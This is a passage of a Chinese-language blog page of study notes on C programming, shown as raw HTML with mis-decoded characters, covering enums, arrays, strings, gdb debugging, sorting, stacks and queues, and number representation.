class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">enum</span> coordinate_<span class="hljs-keyword">type</span> = &#123; <span class="hljs-type">RECTANGULAR</span>, <span class="hljs-type">POLAR</span> &#125;;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ enum æŠŠ <code>coordinate_type</code> å£°æ˜ä¸ºä¸€ä¸ª tag, å…¶ä¸ºæšä¸¾ (Enumeration) ç±»å‹, é»˜è®¤ä» 0 å¼€å§‹åˆ†é….</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">enum</span> coordinate_<span class="hljs-keyword">type</span> = &#123; <span class="hljs-type">RECTANGULAR</span> = 1, <span class="hljs-type">POLAR</span> &#125;;<br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±ä» 1 å¼€å§‹åˆ†é….</p><p>ç»“æ„ä½“çš„æˆå‘˜åå’Œå˜é‡åä¸åœ¨åŒä¸€å‘½åç©ºé—´, æšä¸¾çš„æˆå‘˜åå’Œå˜é‡ååœ¨åŒä¸€å‘½åç©ºé—´ä¸­.</p><h1 id="ç¬¬8ç« -æ•°ç»„"><a href="#ç¬¬8ç« -æ•°ç»„" class="headerlink" title="ç¬¬8ç«  æ•°ç»„"></a>ç¬¬8ç«  æ•°ç»„</h1><p>æ•°ç»„ä¸­å…ƒç´ çš„å­˜å‚¨ç©ºé—´ä¹Ÿæ˜¯ç›¸é‚»çš„.</p><figure class="highlight thrift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs thrift"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">complex_struct</span> </span>&#123;<br>    <span class="hljs-type">double</span> x, y;<br>&#125; a[<span class="hljs-number">4</span>];<br></code></pre></td></tr></table></figure><p>C99 çš„æ–°ç‰¹æ€§å…è®¸åœ¨æ•°ç»„é•¿åº¦è¡¨è¾¾å¼ä¸­ä½¿ç”¨å˜é‡, ç§°ä¸ºå˜é•¿æ•°ç»„ (Variable Length Array), VLA åªèƒ½å®šä¹‰å±€éƒ¨å˜é‡è€Œä¸èƒ½æ˜¯å…¨å±€å˜é‡.</p><p>åœ¨ C è¯­è¨€ä¸­, åç¼€è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§æœ€é«˜, å•ç›®è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§å…¶æ¬¡, æ¯”å…¶ä»–è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§éƒ½é«˜.</p><p>åº”é¿å…æ•°ç»„è¶Šç•Œé—®é¢˜.</p><p>æ•°ç»„ä¹Ÿå¯ä»¥åƒç»“æ„ä½“é‚£æ ·åˆå§‹åŒ–, æœªèµ‹åˆå€¼çš„å…ƒç´ ä¹Ÿæ˜¯ç”¨ 0 æ¥åˆå§‹åŒ–.</p><p>å¦‚æœå®šä¹‰æ•°ç»„æ—¶å°±å°†å…¶åˆå§‹åŒ–, å¯ä»¥ä¸ç”¨æŒ‡å®šé•¿åº¦:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">int</span> count[] = &#123; <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span> &#125;;<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ C99 çš„æ–°ç‰¹æ€§ä¹Ÿå¯ä»¥åš Memberwise Initialization:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">int count[<span class="hljs-number">4</span>] <span class="hljs-operator">=</span> &#123; [<span class="hljs-number">2</span>] <span class="hljs-operator">=</span> <span class="hljs-number">3</span> &#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>æ•°ç»„ä¸èƒ½ç›¸äº’èµ‹å€¼æˆ–åˆå§‹åŒ–.</p><p>å¯¹äºæ•°ç»„ç±»å‹æœ‰ä¸€æ¡ç‰¹æ®Šè§„åˆ™: æ•°ç»„ç±»å‹åšå³å€¼ä½¿ç”¨æ—¶, è‡ªåŠ¨è½¬æ¢æˆæŒ‡å‘æ•°ç»„é¦–å…ƒç´ çš„æŒ‡é’ˆ.</p><p>å› æ­¤, å¦‚:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">int</span> a[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span> &#125;;<br><span class="hljs-attribute">int</span> b[<span class="hljs-number">5</span>];<br><span class="hljs-attribute">b</span> = a;<br></code></pre></td></tr></table></figure><p>è¿™æ ·å†™æ˜¯é”™è¯¯çš„, å³è¾¹çš„ a æ­¤æ—¶æ˜¯æŒ‡é’ˆç±»å‹, è€Œå·¦è¾¹çš„ b ä¸ºæ•°ç»„ç±»å‹.</p><h2 id="8-2-æ•°ç»„åº”ç”¨å®ä¾‹-ç»Ÿè®¡éšæœºæ•°"><a href="#8-2-æ•°ç»„åº”ç”¨å®ä¾‹-ç»Ÿè®¡éšæœºæ•°" class="headerlink" title="8.2 æ•°ç»„åº”ç”¨å®ä¾‹: ç»Ÿè®¡éšæœºæ•°"></a>8.2 æ•°ç»„åº”ç”¨å®ä¾‹: ç»Ÿè®¡éšæœºæ•°</h2><p>C æ ‡å‡†åº“ä¸­ç”Ÿæˆä¼ªéšæœºæ•°çš„æ˜¯ rand å‡½æ•°, éœ€åŒ…å« <code>stdlib.h</code> å¤´æ–‡ä»¶, å…¶æ²¡æœ‰å‚æ•°, è¿”å›å€¼æ˜¯ä¸€ä¸ªä»‹äº 0 å’Œ RAND_MAX ä¹‹é—´çš„æ¥è¿‘å‡åŒ€åˆ†å¸ƒçš„æ•´æ•°. RAND_MAX æ˜¯è¯¥å¤´æ–‡ä»¶ä¸­å®šä¹‰çš„ä¸€ä¸ªå¸¸é‡.</p><p>å®é™…ä¸Šç¼–è¯‘å™¨çš„å·¥ä½œåˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µ, å…ˆæ˜¯é¢„å¤„ç† (preprocess) é˜¶æ®µ, ç„¶åæ‰æ˜¯ç¼–è¯‘é˜¶æ®µ, ç”¨ gcc çš„ -E é€‰é¡¹å¯ä»¥çœ‹åˆ°é¢„å¤„ç†ä¹‹å, ç¼–è¯‘ä¹‹å‰çš„ç¨‹åº. ä½¿ç”¨ cpp (C Preprocessor) ä¹Ÿå¯ä»¥è¾¾åˆ°åŒæ ·çš„æ•ˆæœ, åªåšé¢„å¤„ç†ä¸ç¼–è¯‘.</p><p>è™½ç„¶ include å’Œ define åœ¨é¢„å¤„ç†æŒ‡ç¤ºä¸­æœ‰ç‰¹æ®Šå«ä¹‰, ä½†å®ƒä»¬å¹¶ä¸æ˜¯ C è¯­è¨€çš„å…³é”®è¯.</p><h2 id="8-3-æ•°ç»„åº”ç”¨å®ä¾‹-ç›´æ–¹å›¾"><a href="#8-3-æ•°ç»„åº”ç”¨å®ä¾‹-ç›´æ–¹å›¾" class="headerlink" title="8.3 æ•°ç»„åº”ç”¨å®ä¾‹: ç›´æ–¹å›¾"></a>8.3 æ•°ç»„åº”ç”¨å®ä¾‹: ç›´æ–¹å›¾</h2><p>C æ ‡å‡†åº“å…è®¸æˆ‘ä»¬æŒ‡å®šä¸€ä¸ªåˆå€¼, ç„¶ååœ¨æ­¤åŸºç¡€ä¸Šç”Ÿæˆä¼ªéšæœºæ•°, è¿™ä¸ªåˆå€¼ç§°ä¸º Seed, å¯ä»¥ç”¨ srand å‡½æ•°æŒ‡å®š seed, é€šå¸¸è°ƒç”¨ time å‡½æ•°å¾—åˆ°å½“å‰ç³»ç»Ÿæ—¶é—´è· 1970-1-1-00:00:00 çš„ç§’æ•°, ç„¶åä¼ ç»™ srand:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">srand</span>(<span class="hljs-title"><span class="hljs-built_in">time</span></span>(<span class="hljs-variable"><span class="hljs-literal">NULL</span></span>));</span><br></code></pre></td></tr></table></figure><p>è°ƒç”¨ time éœ€è¦åŒ…å« time.h å¤´æ–‡ä»¶, NULL æ˜¯ç©ºæŒ‡é’ˆ.</p><h2 id="8-4-å­—ç¬¦ä¸²"><a href="#8-4-å­—ç¬¦ä¸²" class="headerlink" title="8.4 å­—ç¬¦ä¸²"></a>8.4 å­—ç¬¦ä¸²</h2><p>å­—ç¬¦ä¸²å­—é¢å€¼ä¹Ÿå¯ä»¥åƒæ•°ç»„åä¸€æ ·ä½¿ç”¨, å¯ä»¥åŠ ä¸‹æ ‡è®¿é—®å…¶ä¸­çš„å­—ç¬¦:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">char c <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello World\n&quot;</span>[<span class="hljs-number">0</span>]<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡ä¸‹æ ‡ä¿®æ”¹å…¶å­—ç¬¦æ˜¯ä¸å…è®¸çš„. ä½†æ˜¯ä¼ ç»™æ•°ç»„åè¿˜æ˜¯å¯ä»¥ä¿®æ”¹æ•°ç»„çš„å†…å®¹çš„.</p><p>å­—ç¬¦ä¸²å­—é¢å€¼åšå³å€¼æ—¶ä¹Ÿä¼šè‡ªåŠ¨è½¬æ¢æˆæŒ‡å‘é¦–å…ƒç´ çš„æŒ‡é’ˆ.</p><p><code>printf(&quot;Hello World&quot;)</code> å…¶å®å°±æ˜¯ä¼ ä¸€ä¸ªæŒ‡é’ˆç»™ printf å‡½æ•°.</p><p>å¦‚æœè¦ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²å­—é¢å€¼å‡†ç¡®åœ°åˆå§‹åŒ–ä¸€ä¸ªå­—ç¬¦æ•°ç»„, æœ€å¥½çš„åŠæ³•æ˜¯ä¸æŒ‡å®šæ•°ç»„çš„é•¿åº¦, è®©ç¼–è¯‘å™¨è‡ªå·±è®¡ç®—:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">char str[] <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello World.\n&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="8-5-å¤šç»´æ•°ç»„"><a href="#8-5-å¤šç»´æ•°ç»„" class="headerlink" title="8.5 å¤šç»´æ•°ç»„"></a>8.5 å¤šç»´æ•°ç»„</h2><p>ä»ç‰©ç†æ¨¡å‹çœ‹, å¤šç»´æ•°ç»„ä¸­çš„å…ƒç´ åœ¨å­˜å‚¨å™¨ä¸­ä»ç„¶æ˜¯è¿ç»­å­˜å‚¨çš„.</p><p>å¤šç»´æ•°ç»„ä¸­, é™¤äº†ç¬¬ä¸€ç»´çš„é•¿åº¦å¯ä»¥ç”±ç¼–è¯‘å™¨è‡ªåŠ¨è®¡ç®—è€Œä¸éœ€è¦æŒ‡å®š, å…¶ä½™å„ç»´éƒ½å¿…é¡»æ˜ç¡®æŒ‡å®šé•¿åº¦.</p><h1 id="ç¬¬9ç« -ç¼–ç é£æ ¼"><a href="#ç¬¬9ç« -ç¼–ç é£æ ¼" class="headerlink" title="ç¬¬9ç«  ç¼–ç é£æ ¼"></a>ç¬¬9ç«  ç¼–ç é£æ ¼</h1><h2 id="9-2-æ³¨é‡Š"><a href="#9-2-æ³¨é‡Š" class="headerlink" title="9.2 æ³¨é‡Š"></a>9.2 æ³¨é‡Š</h2><p>æ³¨é‡Šçš„ä½¿ç”¨åœºåˆ:</p><ul><li>æ•´ä¸ªæºæ–‡ä»¶çš„é¡¶éƒ¨æ³¨é‡Š, è¯´æ˜æ¬¡æ¨¡å—çš„ç›¸å…³ä¿¡æ¯, ä¾‹å¦‚æ–‡ä»¶å, ä½œè€…å’Œç‰ˆæœ¬å†å²ç­‰</li><li>å‡½æ•°æ³¨é‡Š, è¯´æ˜æ­¤å‡½æ•°çš„åŠŸèƒ½, å‚æ•°, è¿”å›å€¼, é”™è¯¯ç ç­‰, å†™åœ¨å‡½æ•°å®šä¹‰ä¸Šä¾§ä¸”ä¸ç•™ç©ºè¡Œ.</li><li>ç›¸å¯¹ç‹¬ç«‹çš„è¯­å¥ç»„æ³¨é‡Š.</li><li>ä»£ç è¡Œå³ä¾§çš„ç®€çŸ­æ³¨é‡Š, ä¸€ä¸ªæºæ–‡ä»¶ä¸­æ‰€æœ‰å³ä¾§ä»£ç æ³¨é‡Šæœ€å¥½èƒ½ä¸Šä¸‹å¯¹é½.</li><li>å¤æ‚çš„ç»“æ„ä½“å®šä¹‰.</li><li>å¤æ‚çš„å®å®šä¹‰å’Œå˜é‡å£°æ˜.</li></ul><h2 id="9-5-indent-å·¥å…·"><a href="#9-5-indent-å·¥å…·" class="headerlink" title="9.5 indent å·¥å…·"></a>9.5 indent å·¥å…·</h2><p>è¿™æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·, ç”¨æ¥è°ƒæ•´ç¼©è¿›, å…¶ä¼šç›´æ¥ä¿®æ”¹æºæ–‡ä»¶:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">$ indent -kr -<span class="hljs-type">i8</span> main.<span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure><p><code>-kr</code> é€‰é¡¹æ˜¯ K&amp;R é£æ ¼, <code>-i8</code> è¡¨ç¤ºç¼©è¿›å…«ä¸ªç©ºæ ¼é•¿åº¦.</p><h1 id="ç¬¬åç« -gdb"><a href="#ç¬¬åç« -gdb" class="headerlink" title="ç¬¬åç«  gdb"></a>ç¬¬åç«  gdb</h1><p><code>-g</code> é€‰é¡¹çš„ä½œç”¨æ˜¯åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­åŠ å…¥æºä»£ç çš„ä¿¡æ¯.</p><p><code>help</code> command, the output is the main type of a class of commands.</p><p><code>list</code> command ä¸€æ¬¡åªåˆ—10è¡Œ. å¯ä»¥ç”¨å‡½æ•°åã€‚</p><p>æŒ‰å›è½¦é”®è¡¨ç¤ºé‡å¤ä¸Šä¸€æ¡å‘½ä»¤ã€‚</p><p>åœ¨è°ƒè¯•æ—¶ä¹Ÿéœ€è¦æºæ–‡ä»¶ã€‚</p><p><code>#0</code>, <code>#1</code> æ˜¯æ ˆå¸§ç¼–å·ã€‚</p><p>æœªåˆå§‹åŒ–çš„å˜é‡å…·æœ‰ä¸ç¡®å®šçš„å€¼ã€‚</p><p><code>$1</code> ä¿å­˜ç€gdbä¸­çš„ä¸­é—´ç»“æœã€‚</p><p>å¯ä»¥åœ¨ gdb ä¸­ä¿®æ”¹å˜é‡çš„å€¼ <code>set</code>.</p><h3 id="åŸºæœ¬å‘½ä»¤"><a href="#åŸºæœ¬å‘½ä»¤" class="headerlink" title="åŸºæœ¬å‘½ä»¤"></a>åŸºæœ¬å‘½ä»¤</h3><ul><li>backtrace(bt)</li><li>finish</li><li>frame(f)</li><li>info(i) locals</li><li>list(l)</li><li>list è¡Œå·</li><li>list å‡½æ•°å</li><li>next(n)</li><li>print(p)</li><li>quit(q)</li><li>set var</li><li>start</li><li>step(s)</li></ul><h2 id="10-2-æ–­ç‚¹"><a href="#10-2-æ–­ç‚¹" class="headerlink" title="10.2 æ–­ç‚¹"></a>10.2 æ–­ç‚¹</h2><p>å­—ç¬¦å‹çš„ â€˜2â€™ è¦å‡å» â€˜0â€™ çš„ ASCII ç æ‰èƒ½è½¬æ¢æˆæ•´æ•°å€¼ 2.</p><p>display å‘½ä»¤å¯ä»¥è·Ÿè¸ªæ˜¾ç¤º. undisplay å–æ¶ˆè·Ÿè¸ªæ˜¾ç¤º.</p><p>è®¾ç½®æ–­ç‚¹çš„å‘½ä»¤ break å’Œ continue ç»“åˆèµ·æ¥ç”¨, continue å‘½ä»¤å°±æ˜¯è¿ç»­è¿è¡Œ, çŸ¥é“é‡åˆ°ä¸€ä¸ªæ–­ç‚¹.</p><p>ä½¿ç”¨ info å‘½ä»¤å¯ä»¥æŸ¥çœ‹å·²ç»è®¾ç½®çš„æ–­ç‚¹:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">info</span> breakpoints<br></code></pre></td></tr></table></figure><p>delete å‘½ä»¤åŠ ä¸Šç¼–å·å¯ä»¥åˆ é™¤æŸä¸ªæ–­ç‚¹.</p><p>å¯ä»¥ç”¨ disable å‘½ä»¤ç¦ç”¨æ–­ç‚¹è€Œä¸æ˜¯åˆ é™¤. enable å¼€å§‹å¯ç”¨.</p><p>å¯ä»¥è®¾ç½®æ–­ç‚¹åœ¨æ»¡è¶³æŸä¸ªæ¡ä»¶æ—¶æ‰æ¿€æ´»:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">break</span> <span class="hljs-number">9</span> if sum != <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ run å‘½ä»¤ä»ç¨‹åºå¼€å¤´è¿ç»­è¿è¡Œ.</p><p>å­—ç¬¦ä¸²çš„é•¿åº¦æ˜¯ä¸åŒ…æ‹¬ â€˜\0â€™ çš„.</p><h2 id="10-3-è§‚å¯Ÿç‚¹"><a href="#10-3-è§‚å¯Ÿç‚¹" class="headerlink" title="10.3 è§‚å¯Ÿç‚¹"></a>10.3 è§‚å¯Ÿç‚¹</h2><p>x å‘½ä»¤æ‰“å°æŒ‡å®šå­˜å‚¨å•å…ƒçš„å†…å®¹:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">(gdb) x/<span class="hljs-number">7</span>b <span class="hljs-selector-tag">input</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>7b</code> æ˜¯æ‰“å°æ ¼å¼, <code>7</code> æŒ‡æ‰“å° 7 ç»„, <code>b</code> è¡¨ç¤ºæ¯ä¸ªå­—èŠ‚ä¸€ç»„, è¿™é‡Œå³ä» input æ•°ç»„çš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¼€å§‹è¿ç»­æ‰“å° 7 ä¸ªå­—èŠ‚. æ‰“å°çš„æ˜¯åå…­è¿›åˆ¶çš„ ASCII ç .</p><p>æ–­ç‚¹æ˜¯å½“ç¨‹åºæ‰§è¡Œåˆ°æŸä¸€è¡Œä»£ç æ—¶ä¸­æ–­, è€Œè§‚å¯Ÿç‚¹ (Watchpoint) æ˜¯å½“ç¨‹åºè®¿é—®æŸä¸ªå­˜å‚¨å•å…ƒæ—¶ä¸­æ–­.</p><p>ç”¨ watch å‘½ä»¤æ¥è®¾ç½®è§‚å¯Ÿç‚¹:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">(gdb) watch <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[5]</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥ç”¨ info å‘½ä»¤æŸ¥çœ‹:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">(gdb) <span class="hljs-built_in">info</span> watchpoints<br></code></pre></td></tr></table></figure><h2 id="10-4-æ®µé”™è¯¯"><a href="#10-4-æ®µé”™è¯¯" class="headerlink" title="10.4 æ®µé”™è¯¯"></a>10.4 æ®µé”™è¯¯</h2><p>å¦‚æœç¨‹åºè¿è¡Œæ—¶å‡ºç°æ®µé”™è¯¯, ç”¨ gdb å¯ä»¥å¾ˆå®¹æ˜“å®šä½åˆ°ç©¶ç«Ÿæ˜¯å“ªä¸€è¡Œå¼•å‘çš„æ®µé”™è¯¯.</p><p>åœ¨ gdb ä¸­è¿è¡Œ, é‡åˆ°æ®µé”™è¯¯ä¼šè‡ªåŠ¨åœä¸‹æ¥, è¿™æ—¶å¯ä»¥ç”¨å‘½ä»¤æŸ¥çœ‹å½“å‰æ‰§è¡Œåˆ°å“ªä¸€è¡Œä»£ç äº†, å¯ä»¥ä½¿ç”¨ bt (backtrace) å‘½ä»¤.</p><p>å¦‚æœæŸä¸ªå‡½æ•°çš„å±€éƒ¨å˜é‡å‘ç”Ÿè®¿é—®è¶Šç•Œ, æœ‰å¯èƒ½å¹¶ä¸ç«‹å³äº§ç”Ÿæ®µé”™è¯¯, è€Œæ˜¯åœ¨å‡½æ•°è¿”å›æ—¶äº§ç”Ÿæ®µé”™è¯¯.</p><h1 id="ç¬¬11ç« -æ’åºä¸æŸ¥æ‰¾"><a href="#ç¬¬11ç« -æ’åºä¸æŸ¥æ‰¾" class="headerlink" title="ç¬¬11ç«  æ’åºä¸æŸ¥æ‰¾"></a>ç¬¬11ç«  æ’åºä¸æŸ¥æ‰¾</h1><h2 id="11-1-ç®—æ³•çš„æ¦‚å¿µ"><a href="#11-1-ç®—æ³•çš„æ¦‚å¿µ" class="headerlink" title="11.1 ç®—æ³•çš„æ¦‚å¿µ"></a>11.1 ç®—æ³•çš„æ¦‚å¿µ</h2><p>ç®—æ³•  (Algorithm) æ˜¯å°†ä¸€ç»„è¾“å…¥è½¬åŒ–æˆä¸€ç»„è¾“å‡ºçš„ä¸€ç³»åˆ—è®¡ç®—æ­¥éª¤, å…¶ä¸­æ¯ä¸ªæ­¥éª¤å¿…é¡»èƒ½åœ¨æœ‰é™æ—¶é—´å†…å®Œæˆ.</p><p>ç®—æ³•ä½¿ç”¨æ¥è§£å†³ä¸€ç±»é—®é¢˜çš„.</p><p>æ¨èä¹¦ç±:</p><ul><li>&lt;&lt; The Art of Computer Programming &gt;&gt;</li><li>&lt;&lt; Introduction to Algorithms &gt;&gt;</li></ul><h2 id="11-2-æ’å…¥æ’åº"><a href="#11-2-æ’å…¥æ’åº" class="headerlink" title="11.2 æ’å…¥æ’åº"></a>11.2 æ’å…¥æ’åº</h2><p>å‡å¦‚æŸä¸ªåˆ¤æ–­æ¡ä»¶æ»¡è¶³ä»¥ä¸‹ä¸‰æ¡å‡†åˆ™, å°±å°†å…¶ç§°ä¸º Loop Invariant:</p><ul><li>ç¬¬ä¸€æ¬¡æ‰§è¡Œå¾ªç¯ä½“ä¹‹å‰è¯¥åˆ¤æ–­ä¸ºçœŸ</li><li>å¦‚æœ â€œç¬¬ N-1 æ¬¡å¾ªç¯ä¹‹å (æˆ–è€…è¯´ N æ¬¡å¾ªç¯ä¹‹å‰) è¯¥åˆ¤æ–­æ¡ä»¶ä¸ºçœŸâ€ è¿™ä¸ªå‰æå¯ä»¥æˆç«‹, é‚£ä¹ˆå°±æœ‰åŠæ³•è¯æ˜ç¬¬ N æ¬¡å¾ªç¯ä¹‹åè¯¥åˆ¤æ–­æ¡ä»¶ä»ä¸ºçœŸ</li><li>å¦‚æœåœ¨æ‰€æœ‰å¾ªç¯ç»“æŸåè¯¥åˆ¤æ–­æ¡ä»¶ä¸ºçœŸ, é‚£ä¹ˆå°±æœ‰åŠæ³•è¯æ˜è¯¥ç®—æ³•æ­£ç¡®åœ°è§£å†³äº†é—®é¢˜</li></ul><h2 id="11-3-ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦åˆ†æ"><a href="#11-3-ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦åˆ†æ" class="headerlink" title="11.3 ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦åˆ†æ"></a>11.3 ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦åˆ†æ</h2><p>åœ¨åˆ†æç®—æ³•çš„æ—¶é—´å¤æ‚åº¦æ—¶, æˆ‘ä»¬æ›´å…³å¿ƒæœ€åæƒ…å†µè€Œä¸æ˜¯æœ€å¥½æƒ…å†µ.</p><p>æˆ‘ä»¬ç”¨ä¸€ç§è·Ÿç²—ç•¥çš„æ–¹å¼è¡¨ç¤ºç®—æ³•çš„æ—¶é—´å¤æ‚åº¦, æŠŠç³»æ•°å’Œä½æ¬¡å¹‚éƒ½çœå», çº¿æ€§å‡½æ•°è®°ä½œ O(n), äºŒæ¬¡å‡½æ•°è®°ä½œ $O(n^2)$.</p><h2 id="11-4-å½’å¹¶æ’åº"><a href="#11-4-å½’å¹¶æ’åº" class="headerlink" title="11.4 å½’å¹¶æ’åº"></a>11.4 å½’å¹¶æ’åº</h2><h1 id="ç¬¬12ç« -æ ˆä¸é˜Ÿåˆ—"><a href="#ç¬¬12ç« -æ ˆä¸é˜Ÿåˆ—" class="headerlink" title="ç¬¬12ç«  æ ˆä¸é˜Ÿåˆ—"></a>ç¬¬12ç«  æ ˆä¸é˜Ÿåˆ—</h1><h2 id="12-1-æ•°æ®ç»“æ„çš„æ¦‚å¿µ"><a href="#12-1-æ•°æ®ç»“æ„çš„æ¦‚å¿µ" class="headerlink" title="12.1 æ•°æ®ç»“æ„çš„æ¦‚å¿µ"></a>12.1 æ•°æ®ç»“æ„çš„æ¦‚å¿µ</h2><p>æ•°æ®ç»“æ„ (Data Structure) æ˜¯æ•°æ®çš„ç»„ç»‡æ–¹å¼.</p><p>æ•°æ®çš„ç»„ç»‡æ–¹å¼åŒ…å«äº†å­˜å‚¨æ–¹å¼å’Œè®¿é—®æ–¹å¼è¿™ä¸¤å±‚æ„æ€, äºŒè€…æ˜¯ç´§å¯†è”ç³»çš„.</p><p>ä¸€ä¸ªé—®é¢˜ä¸­æ•°æ®çš„å­˜å‚¨æ–¹å¼å’Œè®¿é—®æ–¹å¼å†³å®šäº†è§£å†³é—®é¢˜å¯ä»¥é‡‡ç”¨ä»€ä¹ˆæ ·çš„ç®—æ³•, è¦è®¾è®¡ä¸€ä¸ªç®—æ³•å°±è¦åŒæ—¶è®¾è®¡ç›¸åº”çš„æ•°æ®ç»“æ„æ¥æ”¯æŒè¿™ç§ç®—æ³•.</p><p>ç®—æ³• + æ•°æ®ç»“æ„ &#x3D; ç¨‹åº</p><h2 id="12-2-å †æ ˆ"><a href="#12-2-å †æ ˆ" class="headerlink" title="12.2 å †æ ˆ"></a>12.2 å †æ ˆ</h2><h2 id="æ·±åº¦ä¼˜å…ˆæœç´¢"><a href="#æ·±åº¦ä¼˜å…ˆæœç´¢" class="headerlink" title="æ·±åº¦ä¼˜å…ˆæœç´¢"></a>æ·±åº¦ä¼˜å…ˆæœç´¢</h2><h2 id="12-4-é˜Ÿåˆ—ä¸å¹¿åº¦ä¼˜å…ˆæœç´¢"><a href="#12-4-é˜Ÿåˆ—ä¸å¹¿åº¦ä¼˜å…ˆæœç´¢" class="headerlink" title="12.4 é˜Ÿåˆ—ä¸å¹¿åº¦ä¼˜å…ˆæœç´¢"></a>12.4 é˜Ÿåˆ—ä¸å¹¿åº¦ä¼˜å…ˆæœç´¢</h2><p>é˜Ÿåˆ—ä¹Ÿæ˜¯ä¸€ç»„å…ƒç´ çš„é›†åˆ, å®ƒæä¾›ä¸¤ç§åŸºæœ¬æ“ä½œ:</p><ul><li>Enqueue (å…¥é˜Ÿ), å°†å…ƒç´ æ·»åŠ åˆ°é˜Ÿå°¾</li><li>Dequeue (å‡ºé˜Ÿ), ä»é˜Ÿå¤´å–å‡ºå…ƒç´ å¹¶è¿”å›</li></ul><p>FIFO, First In First Out.</p><h1 id="ç¬¬13ç« -è®¡ç®—æœºä¸­æ•°çš„è¡¨ç¤º"><a href="#ç¬¬13ç« -è®¡ç®—æœºä¸­æ•°çš„è¡¨ç¤º" class="headerlink" title="ç¬¬13ç«  è®¡ç®—æœºä¸­æ•°çš„è¡¨ç¤º"></a>ç¬¬13ç«  è®¡ç®—æœºä¸­æ•°çš„è¡¨ç¤º</h1><p>ä»»ä½•å¤æ‚çš„åŠ å‡ä¹˜é™¤è¿ç®—éƒ½å¯ä»¥åˆ†è§£æˆç®€å•çš„é€»è¾‘è¿ç®—.</p><p>å¼‚æˆ– (XOR, eXclusive OR) è¿ç®—, å³ä¸¤ä¸ªæ“ä½œæ•°ç›¸åŒåˆ™ç»“æœä¸º 0, ä¸¤ä¸ªæ“ä½œæ•°ä¸åŒåˆ™ç»“æœä¸º 1.</p><p>æœ€é«˜ä½ (Most Significant Bit, MSB).</p><p>æœ€ä½ä½ (Least Significant Bit, LSB).</p><p>é™¤äºŒååºå–ä½™æ³•, ç”¨äºå°†åè¿›åˆ¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶.</p><h2 id="13-3-æ•´æ•°çš„åŠ å‡è¿ç®—"><a href="#13-3-æ•´æ•°çš„åŠ å‡è¿ç®—" class="headerlink" title="13.3 æ•´æ•°çš„åŠ å‡è¿ç®—"></a>13.3 æ•´æ•°çš„åŠ å‡è¿ç®—</h2><p>åˆ¤æ–­ä¸€ä¸ªæ•°çš„æ­£è´Ÿéƒ½æ˜¯çœ‹æœ€é«˜ä½.</p><p>è¡¨ç¤ºæ³•çš„ä¸åŒåªæ˜¯è®¡ç®—è§„åˆ™ä¸åŒ.</p><h3 id="13-3-1-Sign-and-Magnitude-è¡¨ç¤ºæ³•"><a href="#13-3-1-Sign-and-Magnitude-è¡¨ç¤ºæ³•" class="headerlink" title="13.3.1 Sign and Magnitude è¡¨ç¤ºæ³•"></a>13.3.1 Sign and Magnitude 